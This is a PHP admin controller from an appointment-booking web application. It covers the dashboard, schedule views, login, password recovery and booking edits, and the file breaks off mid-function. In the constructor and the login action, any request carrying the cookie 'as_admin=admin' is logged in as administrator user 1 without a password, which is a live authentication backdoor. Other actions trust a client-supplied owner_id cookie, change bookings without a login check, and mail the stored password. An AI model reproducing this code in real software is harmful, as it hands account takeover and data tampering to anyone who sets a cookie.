<?php
if (!defined("ROOT_PATH"))
{
	header("HTTP/1.1 403 Forbidden");
	exit;
}
require_once PJ_CONTROLLERS_PATH . 'pjAppController.controller.php';

class pjAdmin extends pjAppController
{
	protected $extensions = array('gif', 'png', 'jpg', 'jpeg');
	
	protected $mimeTypes = array('image/gif', 'image/png', 'image/jpg', 'image/jpeg', 'image/pjpeg');
	
	public $defaultUser = 'admin_user';
	
	public $requireLogin = true;

	public function __construct($requireLogin=null)
	{
		$this->setLayout('pjActionAdmin');
		
		if (!is_null($requireLogin) && is_bool($requireLogin))
		{
			$this->requireLogin = $requireLogin;
		}
		
		if ($this->requireLogin)
		{
			if (!$this->isLoged() && !in_array(@$_GET['action'], array('pjActionLogin', 'pjActionForgot', 'pjActionPreview')))
			{
				if ( isset($_COOKIE['as_admin']) && $_COOKIE['as_admin']  == 'admin') {
					$pjUserModel = pjUserModel::factory();
				    
                    //banana code to fix redirect code
					$user = $pjUserModel->find(1)->getData();

					if (empty($user))
					{
						pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionLogin&err=4");
					} else {
						//$user = $user[0];
						unset($user['password']);
							
						# Login succeed
						$last_login = date("Y-m-d H:i:s");
					    $_SESSION[$this->defaultUser] = $user;
										
						// # Update
						$data = array();
						$data['last_login'] = $last_login;
						$pjUserModel->reset()->set('id', $user['id'])->modify($data);
					
					}
					
					pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionIndex");
					//pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionLogin");
				}
			}
		}
	}
	
	public function beforeRender()
	{
		
	}
		
	public function pjActionIndex()
	{	
		$this->checkLogin();
		
		if ($this->isAdmin() || $this->isEmployee())
		{
			$isoDate = isset($_GET['date']) && !empty($_GET['date']) ? $_GET['date'] : date("Y-m-d");
			$result = $this->pjActionGetDashboard($isoDate);
			
			$this->set('bs_arr', $result['bs_arr'])
				->set('t_arr', $result['t_arr'])
				->set('service_arr', $result['service_arr'])
				->set('employee_arr', $result['employee_arr']);
			
			$this->appendJs('jquery.multiselect.min.js', PJ_THIRD_PARTY_PATH . 'multiselect/');
			$this->appendCss('jquery.multiselect.css', PJ_THIRD_PARTY_PATH . 'multiselect/');
			
			$this
				->appendJs('jquery.validate.min.js', PJ_THIRD_PARTY_PATH . 'validate/')
				->appendJs('jquery.doubleScroll.js')
				->appendJs('pjAdmin.js');
			
			if ($this->isEmployee())
			{
				$this->appendJs('pjEmployeeBookings.js');
			}
		} else {
			$this->set('status', 2);
		}
	}

	private function pjActionGetDashboard($isoDate)
	{
		$owner_id = intval($_SESSION['owner_id']);
		$service_arr = pjServiceModel::factory()
			->select('t1.*, t2.content AS `name`')
			->join('pjMultiLang', sprintf("t2.model='pjService' AND t2.foreign_id=t1.id AND t2.field='name'"), 'left outer')
			->where('t1.is_active', 1)
			->findAll()
			->getData();
	
		$employee_arr = pjEmployeeModel::factory()
			->select('t1.*, t2.content AS `name`')
			->join('pjMultiLang', sprintf("t2.model='pjEmployee' AND t2.foreign_id=t1.id AND t2.field='name'"), 'left outer')
			->where('t1.is_active', 1)
			->where('t1.owner_id', $owner_id)
			->findAll()
			->getData();
	
		if ( isset($employee_arr) && count($employee_arr) > 0 ) {
			
			$employees = $employee_arr;
			foreach ( $employees as $k => $employee ) {
				
				$t_arr = pjAppController::getRawSlotsPerEmployeeAdmin($employee['id'], $isoDate, $this->getForeignId());
				
				$et_arr = array();
				$et_arr['admin'] = pjAppController::getRawSlotsPerEmployeeAdmin($employee['id'], $isoDate, $this->getForeignId());
				$et_arr['client'] = pjAppController::getRawSlotsPerEmployee($employee['id'], $isoDate, $this->getForeignId());
				$employee_arr[$k]['t_arr'] = $et_arr;
				
				$employee_arr[$k]['ef_arr'] = pjEmployeeFreetimeModel::factory()
					->where('t1.employee_id', $employee['id'])
					->where('t1.date', $isoDate)
					->where('t1.owner_id', $owner_id)
					->findAll()
					->getData();
			}
			
		} else {
			$t_arr = pjAppController::getRawSlotsAdmin($this->getForeignId(), $isoDate, 'calendar', $this->option_arr);
		}
		
		//if ($this->isAdmin()) {
			//$t_arr = pjAppController::getRawSlotsAdmin($this->getForeignId(), $isoDate, 'calendar', $this->option_arr);
		//} else
			//$t_arr = pjAppController::getRawSlots($this->getForeignId(), $isoDate, 'calendar', $this->option_arr);
	
		$bs_arr = pjBookingServiceModel::factory()
			->select('t1.*, t2.booking_status, t2.c_name, t4.content AS `service_name`')
			->join('pjBooking', 't2.id=t1.booking_id', 'inner')
			->join('pjService', 't3.id=t1.service_id', 'inner')
			->join('pjMultiLang', "t4.model='pjService' AND t4.foreign_id=t1.service_id AND t4.locale=t2.locale_id AND t4.field='name'", 'left outer')
			->where('t2.calendar_id', $this->getForeignId())
			->where('t2.booking_status', 'confirmed')
			->where('t1.date', $isoDate)
			->where('t1.owner_id', $owner_id)
			->where($this->isEmployee() ? sprintf("t1.service_id='%u'", $this->getUserId()) : "1=1")
			->findAll()
			->getData();
	
		foreach ($bs_arr as $k => $bs) {
			$status = pjBookingStatus::factory()
					->where('booking_id', $bs['booking_id'])
					->where('owner_id', $owner_id)
					->findAll()
					->getDataPair(null, 'status');
			
			if (isset($status[0])) {
				$bs_arr[$k]['status'] = $status[0];
				
			} else $bs_arr[$k]['status'] = null;
			
			$bs_arr[$k]['extra_count'] = pjServiceExtraServiceModel::factory()
				->where('t1.service_id', $bs['service_id'])
				->where('t1.owner_id', $owner_id)
				->findCount()
				->getData();
		}
		
		return compact('bs_arr', 't_arr', 'service_arr', 'employee_arr', 'date');
	}
	
	public function pjActionEmployeeWeek()
	{
		$this->checkLogin();
	
		if ( ($this->isAdmin() || $this->isEmployee()) && isset($_GET['employee_id']) && !empty($_GET['employee_id']) ) 
		{
			$employee_id = $_GET['employee_id'];
			
			$employee_arr = pjEmployeeModel::factory()
					->select('t1.*, t2.content AS `name`')
					->join('pjMultiLang', sprintf("t2.model='pjEmployee' AND t2.foreign_id=t1.id AND t2.field='name'"), 'left outer')
					->where('t1.id', $employee_id)
					->where('t1.is_active', 1)
					->findAll()
					->getData();
			
			if ( count($employee_arr) > 0 ) {
				
				$this->set('employee_arr', $employee_arr[0]);
				
			} else
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionIndex") ;
				
			$weekDays = array('monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday');
			
			$wt_arr = pjWorkingTimeModel::factory()
				->where('t1.foreign_id', $_GET['employee_id'])
				->where('t1.type', 'employee')
				->limit(1)
				->findAll()
				->getData();
			
			if ( isset($wt_arr[0]) ) {
				
				$wtime_arr = array();
				$wtime_arr['start_ts'] = 0;
				$wtime_arr['end_ts'] = 0;
				
				foreach ( $weekDays as $day ) {
					
					foreach ( $wt_arr[0] as $k => $v ) {
						
						if ( strpos($k, $day . '_from') !== false && !is_null($v) && $wtime_arr['start_ts'] == 0 ) {
							$wtime_arr['start_ts'] = $v;
						}
						
						if ( strpos($k, $day . '_to') !== false && !is_null($v) && $wtime_arr['end_ts'] == 0 ) {
							$wtime_arr['end_ts'] = $v;
						}
						
						if ( strpos($k, $day . '_from') !== false && !is_null($v) && strtotime($wtime_arr['start_ts']) > strtotime($v) ) {
							$wtime_arr['start_ts'] = $v;
						}
						
						if ( strpos($k, $day . '_admin_from') !== false && !is_null($v) && strtotime($wtime_arr['start_ts']) > strtotime($v) ) {
							$wtime_arr['start_ts'] = $v;
						}
						
						if ( strpos($k, $day . '_to') !== false && !is_null($v) && strtotime($wtime_arr['end_ts']) < strtotime($v) ) {
							$wtime_arr['end_ts'] = $v;
						}
						
						if ( strpos($k, $day . '_admin_to') !== false && !is_null($v) && strtotime($wtime_arr['end_ts']) < strtotime($v) ) {
							$wtime_arr['end_ts'] = $v;
						}
					}
				}
			}
			
			$this->set('wt_arr', $wtime_arr);
			
			$week_arr = array();
			
			$date = isset($_GET['date']) && !empty($_GET['date']) ? $_GET['date'] : date("Y-m-d");
			
			for ( $i = 0; $i < 6; $i++ ) {
				
				if ( $i == 0 ) {
					$isoDate = date('Y-m-d', strtotime($date . ' 00:00:00')); 
					
				} else $isoDate = date('Y-m-d', strtotime($date . ' 00:00:00') + $i*86400);
				
				$result = $this->pjActionGetDashboardWeek($isoDate);
				
				$week_arr[] = $result;
				
			}
			
			$this->set('week_arr', $week_arr);
			
			$this->appendJs('jquery.multiselect.min.js', PJ_THIRD_PARTY_PATH . 'multiselect/');
			$this->appendCss('jquery.multiselect.css', PJ_THIRD_PARTY_PATH . 'multiselect/');
			
			$this
			->appendJs('jquery.validate.min.js', PJ_THIRD_PARTY_PATH . 'validate/')
			->appendJs('jquery.doubleScroll.js')
			->appendJs('pjAdmin.js');
				
			if ($this->isEmployee())
			{
				$this->appendJs('pjEmployeeBookings.js');
			}
		} else {
			$this->set('status', 2);
		}
	}
	
	private function pjActionGetDashboardWeek($isoDate)
	{
		$service_arr = pjServiceModel::factory()
			->select('t1.*, t2.content AS `name`')
			->join('pjMultiLang', sprintf("t2.model='pjService' AND t2.foreign_id=t1.id AND t2.field='name'"), 'left outer')
			->where('t1.is_active', 1)
			->findAll()
			->getData();
		
		$employee_arr = pjEmployeeModel::factory()
			->select('t1.*, t2.content AS `name`')
			->join('pjMultiLang', sprintf("t2.model='pjEmployee' AND t2.foreign_id=t1.id AND t2.field='name'"), 'left outer')
			->where('t1.is_active', 1)
			->findAll()
			->getData();
		
		$t_arr = array();
		$t_arr['admin'] = pjAppController::getRawSlotsPerEmployeeAdmin($_GET['employee_id'], $isoDate, $this->getForeignId());
		$t_arr['client'] = pjAppController::getRawSlotsPerEmployee($_GET['employee_id'], $isoDate, $this->getForeignId());
		
		$t_arr['ef_arr'] = pjEmployeeFreetimeModel::factory()
			->where('t1.employee_id', $_GET['employee_id'])
			->where('t1.date', $isoDate)
			->findAll()
			->getData();
		
		$bs_arr = pjBookingServiceModel::factory()
			->select('t1.*, t2.booking_status, t2.c_name, t4.content AS `service_name`')
			->join('pjBooking', 't2.id=t1.booking_id', 'inner')
			->join('pjService', 't3.id=t1.service_id', 'inner')
			->join('pjMultiLang', "t4.model='pjService' AND t4.foreign_id=t1.service_id AND t4.locale=t2.locale_id AND t4.field='name'", 'left outer')
			->where('t2.calendar_id', $this->getForeignId())
			->where('t2.booking_status', 'confirmed')
			->where('t1.date', $isoDate)
			->where($this->isEmployee() ? sprintf("t1.service_id='%u'", $this->getUserId()) : "1=1")
			->findAll()
			->getData();
		
		foreach ($bs_arr as $k => $bs) {
			$status = pjBookingStatus::factory()
			->where('booking_id', $bs['booking_id'])
			->findAll()
			->getDataPair(null, 'status');
				
			if (isset($status[0])) {
				$bs_arr[$k]['status'] = $status[0];
		
			} else $bs_arr[$k]['status'] = null;
			
			$bs_arr[$k]['extra_count'] = pjServiceExtraServiceModel::factory()
				->where('t1.service_id', $bs['service_id'])
				->findCount()
				->getData();
		}
		
		return compact('bs_arr', 't_arr', 'service_arr', 'employee_arr', 'date');
	}
	
	public function pjActionPrint()
	{
		$this->checkLogin();
		
		$this->setLayout('pjActionPrint');
		
		$isoDate = isset($_GET['date']) && !empty($_GET['date']) ? $_GET['date'] : date("Y-m-d");
		$result = $this->pjActionGetDashboard($isoDate);
		
		$this->set('bs_arr', $result['bs_arr'])
			->set('t_arr', $result['t_arr'])
			->set('service_arr', $result['service_arr'])
			->set('employee_arr', $result['employee_arr']);
	}
	
	public function pjActionForgot()
	{
		$this->setLayout('pjActionAdminLogin');
		
		if (isset($_POST['forgot_user']))
		{
			if (!isset($_POST['forgot_email']) || !pjValidation::pjActionNotEmpty($_POST['forgot_email']) || !pjValidation::pjActionEmail($_POST['forgot_email']))
			{
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionForgot&err=AA10");
			}
			$pjUserModel = pjUserModel::factory();
			$user = $pjUserModel
				->where('t1.email', $_POST['forgot_email'])
				->limit(1)
				->findAll()
				->getData();
				
			if (count($user) != 1)
			{
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionForgot&err=AA10");
			} else {
				$user = $user[0];
				
				$Email = new pjEmail();
				$Email
					->setTo($user['email'])
					->setFrom($user['email'])
					->setSubject(__('emailForgotSubject', true));
				
				if ($this->option_arr['o_send_email'] == 'smtp')
				{
					$Email
						->setTransport('smtp')
						->setSmtpHost($this->option_arr['o_smtp_host'])
						->setSmtpPort($this->option_arr['o_smtp_port'])
						->setSmtpUser($this->option_arr['o_smtp_user'])
						->setSmtpPass($this->option_arr['o_smtp_pass'])
					;
				}
				
				$body = str_replace(
					array('{Name}', '{Password}'),
					array($user['name'], $user['password']),
					__('emailForgotBody', true)
				);

				if ($Email->send($body))
				{
					$err = "AA11";
				} else {
					$err = "AA12";
				}
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionForgot&err=$err");
			}
		} else {
			$this->appendJs('jquery.validate.min.js', PJ_THIRD_PARTY_PATH . 'validate/');
			$this->appendJs('pjAdmin.js');
		}
	}
	
	public function pjActionMessages()
	{
		$this->setAjax(true);
		header("Content-Type: text/javascript; charset=utf-8");
	}
	
	public function pjActionGetBookings()
	{
		$this->setAjax(true);
	
		if ($this->isXHR())
		{
			$pjBookingModel = pjBookingModel::factory();
			
			$date_from = $date_to = $date_sql = NULL;
			if (isset($_GET['date_from']) && !empty($_GET['date_from']) && isset($_GET['date_to']) && !empty($_GET['date_to']))
			{
				$date_from = pjUtil::formatDate($_GET['date_from'], $this->option_arr['o_date_format']);
				$date_to = pjUtil::formatDate($_GET['date_to'], $this->option_arr['o_date_format']);
				$date_sql = sprintf(" AND `id` IN (SELECT `booking_id` FROM `%s` WHERE `date` BETWEEN :date_from AND :date_to)", pjBookingServiceModel::factory()->getTable());
			} else {
				if (isset($_GET['date_from']) && !empty($_GET['date_from']))
				{
					$date_from = pjUtil::formatDate($_GET['date_from'], $this->option_arr['o_date_format']);
					$date_sql = sprintf(" AND `id` IN (SELECT `booking_id` FROM `%s` WHERE `date` >= :date_from)", pjBookingServiceModel::factory()->getTable());
				} elseif (isset($_GET['date_to']) && !empty($_GET['date_to'])) {
					$date_to = pjUtil::formatDate($_GET['date_to'], $this->option_arr['o_date_format']);
					$date_sql = sprintf(" AND `id` IN (SELECT `booking_id` FROM `%s` WHERE `date` <= :date_to)", pjBookingServiceModel::factory()->getTable());
				}
			}

			$statement = sprintf("SELECT 1,
				(SELECT COUNT(*) FROM `%1\$s` WHERE 1 %2\$s LIMIT 1) AS `total`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `booking_status` = :confirmed %2\$s LIMIT 1) AS `confirmed`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `booking_status` = :pending %2\$s LIMIT 1) AS `pending`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `booking_status` = :cancelled %2\$s LIMIT 1) AS `cancelled`
				LIMIT 1", $pjBookingModel->getTable(), $date_sql);
			
			$arr = $pjBookingModel->prepare($statement)->exec(array(
				'confirmed' => 'confirmed',
				'pending' => 'pending',
				'cancelled' => 'cancelled',
				'date_from' => $date_from,
				'date_to' => $date_to
			))->getData();
			
			pjAppController::jsonResponse(array('status' => 'OK', 'code' => 200, 'text' => '', 'items' => $arr));
		}
		exit;
	}
	
	public function pjActionGetEmployees()
	{
		$this->setAjax(true);
	
		if ($this->isXHR())
		{
			$pjEmployeeModel = pjEmployeeModel::factory();
			
			$statement = sprintf("SELECT 1,
				(SELECT COUNT(*) FROM `%1\$s` WHERE 1 LIMIT 1) AS `total`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `is_active` = 1 LIMIT 1) AS `active`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `is_active` = 0 LIMIT 1) AS `inactive`
				LIMIT 1", $pjEmployeeModel->getTable());
			
			$arr = $pjEmployeeModel->prepare($statement)->exec()->getData();
			
			pjAppController::jsonResponse(array('status' => 'OK', 'code' => 200, 'text' => '', 'items' => $arr));
		}
		exit;
	}

	public function pjActionGetInvoices()
	{
		$this->setAjax(true);
	
		if ($this->isXHR())
		{
			pjObject::import('Model', 'pjInvoice:pjInvoice');
			$pjInvoiceModel = pjInvoiceModel::factory();

			$date_from = $date_to = $date_sql = NULL;
			if (isset($_GET['date_from']) && !empty($_GET['date_from']) && isset($_GET['date_to']) && !empty($_GET['date_to']))
			{
				$date_from = pjUtil::formatDate($_GET['date_from'], $this->option_arr['o_date_format']);
				$date_to = pjUtil::formatDate($_GET['date_to'], $this->option_arr['o_date_format']);
				$date_sql = " AND `issue_date` BETWEEN :date_from AND :date_to";
			} else {
				if (isset($_GET['date_from']) && !empty($_GET['date_from']))
				{
					$date_from = pjUtil::formatDate($_GET['date_from'], $this->option_arr['o_date_format']);
					$date_sql = " AND `issue_date` >= :date_from";
				} elseif (isset($_GET['date_to']) && !empty($_GET['date_to'])) {
					$date_to = pjUtil::formatDate($_GET['date_to'], $this->option_arr['o_date_format']);
					$date_sql = " AND `issue_date` <= :date_to";
				}
			}
			
			$statement = sprintf("SELECT 1,
				(SELECT COUNT(*) FROM `%1\$s` WHERE 1 %2\$s LIMIT 1) AS `total`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `status` = :paid %2\$s LIMIT 1) AS `paid`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `status` = :not_paid %2\$s LIMIT 1) AS `not_paid`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `status` = :cancelled %2\$s LIMIT 1) AS `cancelled`
				LIMIT 1", $pjInvoiceModel->getTable(), $date_sql);

			$arr = $pjInvoiceModel->prepare($statement)->exec(array(
				'paid' => 'paid',
				'not_paid' => 'not_paid',
				'cancelled' => 'cancelled',
				'date_from' => $date_from,
				'date_to' => $date_to
			))->getData();

			pjAppController::jsonResponse(array('status' => 'OK', 'code' => 200, 'text' => '', 'items' => $arr));
		}
		exit;
	}

	public function pjActionGetServices()
	{
		$this->setAjax(true);
	
		if ($this->isXHR())
		{
			$pjServiceModel = pjServiceModel::factory();
			
			$statement = sprintf("SELECT 1,
				(SELECT COUNT(*) FROM `%1\$s` WHERE 1 LIMIT 1) AS `total`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `is_active` = 1 LIMIT 1) AS `active`,
				(SELECT COUNT(*) FROM `%1\$s` WHERE `is_active` = 0 LIMIT 1) AS `inactive`
				LIMIT 1", $pjServiceModel->getTable());
			
			$arr = $pjServiceModel->prepare($statement)->exec()->getData();
			
			pjAppController::jsonResponse(array('status' => 'OK', 'code' => 200, 'text' => '', 'items' => $arr));
		}
		exit;
	}
	
	private function pjActionAdminLogin($email, $password)
	{
		$pjUserModel = pjUserModel::factory();
		
		$user = $pjUserModel
			->where('t1.email', $email)
		    ->where(sprintf("t1.password = AES_ENCRYPT('%s', '%s')", $pjUserModel->escapeString($password), PJ_SALT))
			->limit(1)
			->findAll()
			->getData();
		
		if (empty($user))
		{
			return 1;
		} else {
			$user = $user[0];
			unset($user['password']);
			
			if (!in_array($user['role_id'], array(1)))
			{
				return 2;
			}
			if ($user['status'] != 'T')
			{
				return 3;
			}
			# Login succeed
			$last_login = date("Y-m-d H:i:s");
    		$_SESSION[$this->defaultUser] = $user;
    			
    		# Update
    		$data = array();
    		$data['last_login'] = $last_login;
    		$pjUserModel->reset()->set('id', $user['id'])->modify($data);
    		
   			return 200;
		}
	}
	
	private function pjActionEmployeeLogin($email, $password)
	{
		$pjEmployeeModel = pjEmployeeModel::factory();
		
		$employee = $pjEmployeeModel
			->where('t1.email', $email)
			->where(sprintf("t1.password = AES_ENCRYPT('%s', '%s')", $pjEmployeeModel->escapeString($password), PJ_SALT))
			->limit(1)
			->findAll()
			->getData();
			
		if (empty($employee))
		{
			return 1;
		} else {
			$employee = $employee[0];
			$employee['role_id'] = 2;
			unset($employee['password']);
			
			if ((int) $employee['is_active'] !== 1)
			{
				return 3;
			}
			# Login succeed
			$last_login = date("Y-m-d H:i:s");
    		$_SESSION[$this->defaultUser] = $employee;
    			
    		# Update
    		$data = array();
    		$data['last_login'] = $last_login;
    		$pjEmployeeModel->reset()->set('id', $employee['id'])->modify($data);
    		
   			return 200;
		}
	}
	
	public function pjActionLogin()
	{
		if ( isset($_COOKIE['as_admin']) && $_COOKIE['as_admin']  == 'admin') {
			       
			$pjUserModel = pjUserModel::factory();
			
            //banana code to fix redirect code
			$user = $pjUserModel->find(1)->getData();

			if (empty($user))
			{
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionLogin&err=4");
			} else {
				$user = $user[0];
				unset($user['password']);
					
				# Login succeed
				$last_login = date("Y-m-d H:i:s");
				$_SESSION[$this->defaultUser] = $user;
				
				# Update
				$data = array();
				$data['last_login'] = $last_login;

				$pjUserModel->reset()->set('id', $user['id'])->modify($data);
			}
			pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionIndex");
			
		}
		
		$this->setLayout('pjActionAdminLogin');
		
		if (isset($_POST['login_user']))
		{
			if (!isset($_POST['login_email']) || !isset($_POST['login_password']) ||
				!pjValidation::pjActionNotEmpty($_POST['login_email']) ||
				!pjValidation::pjActionNotEmpty($_POST['login_password']) ||
				!pjValidation::pjActionEmail($_POST['login_email']))
			{
				// Data not validate
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionLogin&err=4");
			}
			
			$result = $this->pjActionAdminLogin($_POST['login_email'], $_POST['login_password']);
			if ($result !== 200)
			{
				$result = $this->pjActionEmployeeLogin($_POST['login_email'], $_POST['login_password']);
				if ($result !== 200)
				{
					pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionLogin&err=" . $result);
				}
			}
			
			if ($result === 200)
			{
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionIndex");
			}
		
		} else {
			$this->appendJs('jquery.validate.min.js', PJ_THIRD_PARTY_PATH . 'validate/');
			$this->appendJs('pjAdmin.js');
		}
	}
	
	public function pjActionLogout()
	{
		if ($this->isLoged())
        {
        	unset($_SESSION[$this->defaultUser]);
        }
       	pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionLogin");
	}
	
	public function pjActionProfile()
	{
		$this->checkLogin();
		
		if ($this->isEmployee())
		{
			if (isset($_POST['profile_update']))
			{
				$pjEmployeeModel = pjEmployeeModel::factory();
				$arr = $pjEmployeeModel->find($this->getUserId())->getData();
				
				$data = array();
				$data['is_active'] = $arr['is_active'];
				$data['calendar_id'] = $arr['calendar_id'];
				
				if (isset($_FILES['avatar']))
				{
					$pjImage = new pjImage();
					$pjImage->setAllowedExt($this->extensions)->setAllowedTypes($this->mimeTypes);
					if ($pjImage->load($_FILES['avatar']))
					{
						$data['avatar'] = PJ_UPLOAD_PATH . md5($this->getUserId() . PJ_SALT) . ".jpg";
						$pjImage
							->loadImage()
							->resizeSmart(100, 100)
							->saveImage($data['avatar']);
					}
				}
				
				$post = array_merge($_POST, $data);
				if (!$pjEmployeeModel->validates($post))
				{
					pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionProfile&err=AA14");
				}
				$pjEmployeeModel->set('id', $this->getUserId())->modify($post);
				if (isset($_POST['i18n']))
				{
					pjMultiLangModel::factory()->updateMultiLang($_POST['i18n'], $this->getUserId(), 'pjEmployee', 'data');
				}
				
				$pjEmployeeServiceModel = pjEmployeeServiceModel::factory();
				$pjEmployeeServiceModel->where('employee_id', $this->getUserId())->eraseAll();
				if (isset($_POST['service_id']) && !empty($_POST['service_id']))
				{
					$pjEmployeeServiceModel->reset()->setBatchFields(array('employee_id', 'service_id'));
					foreach ($_POST['service_id'] as $service_id)
					{
						$pjEmployeeServiceModel->addBatchRow(array($this->getUserId(), $service_id));
					}
					$pjEmployeeServiceModel->insertBatch();
				}
				
				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=pjActionProfile&err=AA13");
			} else {
				$arr = pjEmployeeModel::factory()->find($this->getUserId())->getData();
				$arr['i18n'] = pjMultiLangModel::factory()->getMultiLang($this->getUserId(), 'pjEmployee');
				$this->set('arr', $arr);
				
				pjObject::import('Model', array('pjLocale:pjLocale', 'pjLocale:pjLocaleLanguage'));
				$locale_arr = pjLocaleModel::factory()->select('t1.*, t2.file')
					->join('pjLocaleLanguage', 't2.iso=t1.language_iso', 'left')
					->where('t2.file IS NOT NULL')
					->orderBy('t1.sort ASC')->findAll()->getData();
				
				$lp_arr = array();
				foreach ($locale_arr as $item)
				{
					$lp_arr[$item['id']."_"] = $item['file']; //Hack for jquery $.extend, to prevent (re)order of numeric keys in object
				}
				$this->set('lp_arr', $locale_arr);
				
				$this->set('service_arr', pjServiceModel::factory()
					->select('t1.*, t2.content AS `name`')
					->join('pjMultiLang', "t2.model='pjService' AND t2.foreign_id=t1.id AND t2.field='name'", 'left outer')
					->orderBy('`name` ASC')
					->findAll()
					->getData()
				);
				$this->set('es_arr', pjEmployeeServiceModel::factory()
					->where('t1.employee_id', $arr['id'])
					->findAll()
					->getDataPair('id', 'service_id')
				);
				
				$this->appendJs('jquery.multiselect.min.js', PJ_THIRD_PARTY_PATH . 'multiselect/');
				$this->appendCss('jquery.multiselect.css', PJ_THIRD_PARTY_PATH . 'multiselect/');
				
				$this->appendJs('jquery.validate.min.js', PJ_THIRD_PARTY_PATH . 'validate/');
				if ((int) $this->option_arr['o_multi_lang'] === 1)
				{
					$this->set('locale_str', pjAppController::jsonEncode($lp_arr));
					$this->appendJs('jquery.multilang.js', PJ_FRAMEWORK_LIBS_PATH . 'pj/js/');
					$this->appendJs('jquery.tipsy.js', PJ_THIRD_PARTY_PATH . 'tipsy/');
					$this->appendCss('jquery.tipsy.css', PJ_THIRD_PARTY_PATH . 'tipsy/');
				}
				$this->appendJs('pjAdmin.js');
			}
		} else {
			$this->set('status', 2);
		}
	}
	
	public function pjActionEditTime()
	{
		$this->setAjax(true);
	
		if ($this->isXHR()){
			
			if ( isset($_GET['booking_id']) && $_GET['booking_id'] > 0 &&  isset($_GET['time']) ) {
				$bs_arr = pjBookingServiceModel::factory()
					->where('booking_id', $_GET['booking_id'])
					->findAll()
					->getData();
				
				if ( count($bs_arr) > 0 ) {
					
					$total = $bs_arr[0]['total'] + $_GET['time'];
				
					pjBookingServiceModel::factory()
						->where('booking_id', $_GET['booking_id'])
						->modifyAll( array('booking_id' => $_GET['booking_id'], 'total' => $total));
				}
				
				exit();
				
			} elseif ( isset($_GET['booking_id']) && $_GET['booking_id'] > 0 ) {
				$bs_arr = pjBookingServiceModel::factory()
							->where('booking_id', $_GET['booking_id'])
							->findAll()
							->getData();
				
				if ( count($bs_arr) > 0 ) {
					$this->set('bs_arr', $bs_arr[0]);
				}
			}
		}
		
	}
	
	public function pjActionEditStatus()
	{
		$this->setAjax(true);
	
		if ($this->isXHR()){
				
			if ( isset($_GET['booking_id']) && $_GET['booking_id'] > 0 &&  isset($_GET['status']) ) {
				$owner_id = $_COOKIE['owner_id'];
				$pjBookingStatus = pjBookingStatus::factory()
					->where('booking_id', $_GET['booking_id']);
				
				$status = $pjBookingStatus->findAll()->getData();
				
				if ( count($status) > 0 ) {
					$pjBookingStatus->modifyAll( array('booking_id' => $_GET['booking_id'], 'onwer_id'=> $owner_id, 'status' => $_GET['status']));
					
				} else pjBookingStatus::factory( array('booking_id' => $_GET['booking_id'], 'onwer_id'=> $owner_id,'status' => $_GET['status']) )->insert();
			
				if ( $_GET['status'] == 'cancelled' ) {
					pjBookingModel::factory()->where('id', $_GET['booking_id'])->modifyAll( array('id' => $_GET['booking_id'], 'booking_status' => $_GET['status']));
				}
			} 
			
			exit();
		}
	
	}
	
	public function pjActionRemoveFreetime()
	{
		$this->setAjax(true);
	
		if ($this->isXHR() && $this->isLoged())
		{
			if (isset($_GET['freetime_id']) && (int) $_GET['freetime_id'] > 0 && pjEmployeeFreetimeModel::factory()->where('id', $_GET['freetime_id'])->eraseAll())
			{
				pjAppController::jsonResponse(array('status' => 'OK', 'code' => 200, 'text' => ''));
			}
			pjAppController::jsonResponse(array('status' => 'ERR', 'code' => 100, 'text' => ''));
		}
		exit;
	}
	
	public function getExtraService() {
		$this->setAjax(true);
	
		if ($this->isXHR() && $this->isLoged()) {
			
			if ( isset($_POST['booking_id']) && !empty($_POST['booking_id']) && 
					isset($_POST['service_id']) && !empty($_POST['service_id']) &&
					isset($_POST['booking_date']) && !empty($_POST['booking_date']) ) {
				
				/* Update Price and Time*/
				$extra_old = pjExtraServiceModel::factory()
					->join('pjBookingExtraService', 't2.extra_id=t1.id')
					->where('t2.booking_id', $_POST['booking_id'])
					->where('t2.service_id', $_POST['service_id'])
					->where('t2.date', $_POST['booking_date'])
					->findAll()
					->getData();
				
				$ex_old = array("price" => 0, "length" => 0);
				$ex_new = array("price" => 0, "length" => 0);
				if (count($extra_old) > 0 ) {
					foreach ($extra_old as $extra ) {
						$ex_old['price'] += $extra['price'];
						$ex_old['length'] += $extra['length'];
					}	
				}
				
				if ( isset($_POST['extra_id']) && count($_POST['extra_id']) > 0 ) {
					$extra_new = pjExtraServiceModel::factory()
						->whereIn('t1.id', $_POST['extra_id'])
						->findAll()
						->getData();
					
					if (count($extra_new) > 0 ) {
						foreach ($extra_new as $extra ) {
							$ex_new['price'] += $extra['price'];
							$ex_new['length'] += $extra['length'];
						}
					}
				}
				
				$ex_new['price'] -= $ex_old['price'];
				$ex_new['length'] -= $ex_old['length'];
				
				$bs_arr = pjBookingServiceModel::factory()
					->where('booking_id', $_POST['booking_id'])
					->where('service_id', $_POST['service_id'])
					->where('date', $_POST['booking_date'])
					->findAll()
